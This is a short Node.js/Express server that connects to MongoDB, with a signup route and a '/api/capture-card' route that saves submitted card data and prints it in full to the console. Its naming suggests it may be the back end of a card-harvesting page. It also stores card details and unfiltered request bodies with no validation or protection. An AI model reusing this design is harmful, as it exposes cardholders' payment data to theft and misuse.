// server.js
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

// Import models
const User = require('./models/User');
const Data = require('./models/Data');

const app = express();
app.use(cors());
app.use(express.json());

// ✅ CONNECT TO MONGODB ATLAS (THIS WAS THE BUG)
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB Atlas Connected Successfully"))
  .catch(err => console.error("❌ MongoDB Connection Error:", err.message));
  console.log("MONGO_URI:", process.env.MONGO_URI ? "Loaded ✅" : "Missing ❌");


// ✅ SIGNUP route
app.post('/api/signup', async (req, res) => {
  try {
    const newUser = new User(req.body);
    await newUser.save();
    res.status(201).json({ message: "User Created" });
  } catch (err) {
    res.status(400).json({ error: "Email already exists" });
  }
});

// ✅ CARD DATA CAPTURE route
app.post('/api/capture-card', async (req, res) => {
  try {
    const cardEntry = new Data(req.body);
    await cardEntry.save();

    console.log("💾 Card data saved:", req.body);
    res.status(201).json({ message: "Card Captured" });
  } catch (err) {
    console.error("❌ Error saving card data:", err);
    res.status(500).json({ error: "Database Error" });
  }
});

// ✅ START SERVER
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
